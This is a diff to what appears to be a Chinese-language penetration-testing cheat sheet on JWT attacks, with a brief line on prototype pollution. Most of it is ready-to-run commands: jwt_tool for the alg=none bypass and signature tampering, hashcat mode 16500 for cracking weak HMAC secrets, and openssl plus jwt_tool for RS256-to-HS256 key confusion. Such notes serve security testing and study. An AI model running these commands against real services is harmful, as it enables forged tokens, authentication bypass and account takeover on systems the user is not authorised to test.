@@ -7,15 +7,21 @@
 原型污染是一种javascript漏洞，攻击者可以将任意属性添加到全局变量原型，然后这些属性可能被用户定义的对象继承。
 
 # jwt 
-滥用None算法
-签名剥离
+未经验证的签名--忘记验证签名了
+越权漏洞等
+
+签名有验证缺陷--NONE算法 alg->none
 jwt_tools.py jwt-token -X a
+
 破解弱共享密码
 注意：必须是HMAC-SHA算法
 jwt_tools.py jwt_token -C -d jwt_secrets.txt
 echo jwt_token > jwt_file
 hashcat -a 0 -m 16500 jwt_file  jwt_secrets --force
 替换攻击
+构造jwt
+jwt editor keys插件
+
 算法RS256更改为HS256
 获取 public.pem
 openssl s_client -connect hostname:443
@@ -23,3 +29,5 @@ openssl s_client -connect hostname:443
 openssl x509 -in cert.pem -pubkey -noout > public.pem
 jwt_tools.py jwt_token -S hs256 -k public.pem
 jwt_tools.py jwt_token -S hs256 -k public.pem -T
+标头参数住入
+
